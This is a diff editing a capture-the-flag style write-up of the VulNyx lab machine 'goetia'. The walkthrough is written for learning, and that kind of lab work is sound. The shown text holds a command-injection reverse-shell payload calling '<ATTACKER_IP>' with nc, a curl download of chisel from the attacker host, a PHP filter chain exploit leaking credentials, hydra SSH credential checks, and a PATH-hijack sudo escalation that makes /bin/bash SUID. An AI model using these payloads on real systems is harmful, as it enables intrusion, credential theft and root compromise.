@@ -8,15 +8,15 @@
 | **Creator** | `UnD3sc0n0c1d0` |
 | **Tools used** | `nmap` · `curl` · `html2text` · `nc` · `chisel` · `wfuzz` · `unzip` · `hydra` |
 | **Tags** | `#CommandInjection` `#RCE` `#Pivoting` `#PHPFilterChain` `#PATHHijacking` |
-| **URL** | https://vulnyx.com/machines/  |
+| **URL** | https://vulnyx.com/machines/ |
 
 The main page passes user input straight into a shell command, giving remote code execution and a reverse shell. From there, a service listening only on localhost is reached by tunneling through the box with `chisel`, exposing an internal web app whose backup ZIP leaks its source code. That source is vulnerable to a PHP filter chain exploit, used to leak SSH credentials. A final sudo rule that runs a script without a fixed `PATH` is hijacked to gain a root shell.
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn goetia.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:54:CF:0D (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV goetia.nyx
@@ -69,7 +69,7 @@ $ curl -sX POST "http://goetia.nyx/index.php" -d "input=;id;a" | grep "textarea"
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-The output of `id` comes back inside the page's response, confirming the injection works. The same syntax is reused to get a reverse shell instead of a one-off command:
+The output of `id` comes back inside the page's response, confirming the injection works. The same syntax gets a reverse shell instead of a one-off command:
 
 > **Payload:** `; ;nc <ATTACKER_IP> <PORT> -e /bin/sh`
 
@@ -83,7 +83,7 @@ id
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python -c 'import pty; pty.spawn ("/bin/bash")'
@@ -112,7 +112,7 @@ tcp    LISTEN     0      128         [::]:22                    [::]:*
 tcp    LISTEN     0      100        [::1]:25                    [::]:*
 ```
 
-`ss` shows a service bound to `127.0.0.1:8000` — reachable from inside the box, but not from the outside. `chisel` is used to tunnel it out. The binary is served over a quick HTTP server on the attack machine and pulled down on the target:
+`ss` shows a service bound to `127.0.0.1:8000` — reachable from inside the box, but not from the outside. `chisel` tunnels it out. A quick HTTP server on the attack machine serves the binary, and the target pulls it down:
 
 ```bash
 # Attacker machine
@@ -122,7 +122,7 @@ $ python -m http.server
 bash-4.2$ curl http://<ATTACKER_IP>:8000/chisel --output chisel
 ```
 
-A reverse tunnel is set up: the attack machine runs a chisel server waiting for a client to connect back, and the target's chisel client requests a remote forward — anything hitting port 8000 on the *attack* machine gets forwarded through the tunnel to `127.0.0.1:8000` on the *target*:
+The tunnel runs in reverse: the attack machine runs a chisel server waiting for a client to connect back, and the target's chisel client requests a remote forward — anything hitting port 8000 on the *attack* machine gets forwarded through the tunnel to `127.0.0.1:8000` on the *target*:
 
 ```bash
 # Attacker machine
@@ -145,11 +145,12 @@ The internal service is now reachable locally:
 ```
 http://localhost:8000
 ```
+
 <img src="../Images/goetia/Pasted image 20260714214403.png"/>
 
 ### Finding and Reading a Backup
 
-A content discovery scan is run against the tunneled app, fuzzing both filenames and extensions at once:
+A content discovery scan runs against the tunneled app, fuzzing both filenames and extensions at once:
 
 ```bash
 $ wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,php-zip "http://localhost:8000/FUZZ.FUZ2Z"
@@ -202,7 +203,7 @@ PHP's `php://filter` chains can be stacked to progressively transform a file's c
 $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1:8000 --file '/var/www/html/hidden.php' --parameter input
 
 [+] File /var/www/html/hidden.php leak is finished!
-PD9waHAKZGVmaW5lKCdEQl90QU1lJywgJ0FuRWxpemFiZXRoYW5EZXZpbFdvcnNoaXBwZXJzUHJheWVyQm9vayonKZ
+PD9waHAKZGVmaW5lKCdEQl90QU1lJywgJ0FuRWxpemFiZXRoYW5EZXZpbFdvcnNoaXBwZXJzUHJheWVyQm9vayopKZ
 WZpbmUoJ0RCX1VTRVInLCAnZWJhdGhvcnknKTsKZGVmaW5lKCdEQl9QQVNTV09SRCcsICdDNDNyMW0wbjE0UzRuZ3VpbD
 NudHUnKTsKZGVmaW5lKCdEQl9IT1NUJywgJ2xvY2FsaG9zdCcpOwZpbmUoJ0RCX0NIQVJTRVQnLCAndXRmOCcpOwo
 7"<?phpndefine('DB_NAME', 'AnElizabethanDevilWorshippersPrayerBook');ndefine('DB_USER', 'eb
@@ -214,7 +215,7 @@ define('DB_CHARSET', 'utf8');?>"
 
 ### Shell as ebathory
 
-The credentials are validated against SSH:
+`hydra` validates the credentials against SSH:
 
 ```bash
 $ hydra -l 'ebathory' -p 'C43r1m0n14S4nguil3ntu' ssh://goetia.nyx
@@ -232,9 +233,6 @@ They check out, and a connection follows:
 
 ```bash
 $ ssh ebathory@goetia.nyx
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
 ebathory@goetia.nyx's password:
 [ebathory@goetia ~]$ id
 uid=1000(ebathory) gid=1000(ebathory) groups=1000(ebathory)
@@ -270,7 +268,7 @@ User ebathory may run the following commands on goetia:
 /usr/bin/systemctl --no-pager | wc -l
 ```
 
-The sudo rule lets `ebathory` run `/opt/services.sh` as root while keeping control of the `PATH` environment variable. The script itself calls at least one command — named `wc`, going by the payload below — without a full path, which means whatever `PATH` says to use for resolving `wc` is trusted. A fake `wc` is placed somewhere writable and put first in `PATH`:
+The `SETENV` tag is the key: the sudo rule lets `ebathory` run `/opt/services.sh` as root *while keeping control of the environment* — `PATH` included. The script calls `wc` without a full path, so whatever `PATH` says to use for resolving `wc` is trusted. A fake `wc` goes somewhere writable and gets put first in `PATH`:
 
 ```bash
 [ebathory@goetia ~]$ echo "chmod +s /bin/bash" > /tmp/wc
@@ -279,7 +277,7 @@ The sudo rule lets `ebathory` run `/opt/services.sh` as root while keeping contr
 [ebathory@goetia ~]$ /bin/bash -p
 ```
 
-When the script runs as root and resolves `wc` from `/tmp` instead of its usual location, the fake binary runs instead — setting the SUID bit on `/bin/bash`:
+When the script runs as root and resolves `wc` from `/tmp` instead of its usual location, the fake binary runs instead — setting the SUID bit on `/bin/bash`. A SUID `bash` invoked with `-p` keeps its owner's privileges:
 
 ```bash
 bash-4.2# id
